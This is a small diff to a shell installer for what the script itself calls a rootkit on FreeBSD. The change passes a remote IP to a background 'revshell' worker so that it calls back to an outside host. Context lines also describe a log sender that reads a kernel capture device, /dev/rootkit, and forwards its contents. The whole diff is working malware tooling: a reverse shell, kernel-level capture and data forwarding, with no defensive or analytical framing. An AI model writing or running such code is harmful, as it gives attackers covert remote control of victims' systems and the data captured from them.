@@ -28,7 +28,7 @@ fail() {
 [ -f "$ELEVATE_SRC" ] || fail "Source file not found: $ELEVATE_SRC"
 
 # Store REMOTE IP for reverse shell callbacks
-echo "$REMOTE_IP" > /etc/rootkit_remote_ip
+# echo "$REMOTE_IP" > /etc/rootkit_remote_ip
 
 # Check dependencies
 for command in make kldload kldstat cc install sysrc realpath; do
@@ -93,7 +93,7 @@ fi
 # Launch revshell background worker using the installed binary path
 if [ -x /usr/local/bin/revshell ]; then
     pkill -f revshell 2>/dev/null || true
-    nohup /usr/local/bin/revshell >/dev/null 2>&1 &
+    nohup /usr/local/bin/revshell "$REMOTE_IP" >/dev/null 2>&1 &
 fi
 
 # Log sender: reads the kernel capture ring (/dev/rootkit) and forwards it over
